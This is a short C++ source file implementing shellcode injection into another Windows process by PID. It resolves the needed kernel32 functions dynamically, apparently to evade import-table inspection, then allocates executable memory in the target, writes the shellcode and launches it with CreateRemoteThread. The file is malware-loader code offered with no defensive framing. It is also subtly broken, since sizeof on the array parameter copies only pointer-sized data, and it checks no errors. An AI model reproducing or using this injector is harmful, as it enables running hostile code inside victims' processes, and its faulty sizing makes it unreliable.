#include <Windows.h>
#include "typedef.hpp"
#include "memory.hpp"

namespace execute {
	VOID CreateRemoteThread(_In_ DWORD PID, _In_ unsigned char Shellcode[])
	{
		HANDLE hProcess = NULL;
		PVOID pAddress = NULL;
		BOOL Success;
		HANDLE hThread = NULL;
		SIZE_T BytesWritten = 0;

		HMODULE kernel32 = memory::_GetModuleHandle(L"kernel32.dll");

		typeOpenProcess pOpenProcess = (typeOpenProcess)memory::_GetProcAddress(kernel32, "OpenProcess");
		typeVirtualAllocEx pVirtualAllocEx = (typeVirtualAllocEx)memory::_GetProcAddress(kernel32, "VirtualAllocEx");
		typeWriteProcessMemory pWriteProcessMemory = (typeWriteProcessMemory)memory::_GetProcAddress(kernel32, "WriteProcessMemory");
		typeCreateRemoteThread pCreateRemoteThread = (typeCreateRemoteThread)memory::_GetProcAddress(kernel32, "CreateRemoteThread");

		hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
		pAddress = pVirtualAllocEx(hProcess, NULL, sizeof(Shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
		Success = pWriteProcessMemory(hProcess, pAddress, Shellcode, sizeof(Shellcode), &BytesWritten);
		hThread = pCreateRemoteThread(hProcess, 0, NULL, (LPTHREAD_START_ROUTINE)pAddress, 0, NULL, 0);
	}
} // End of execute namespace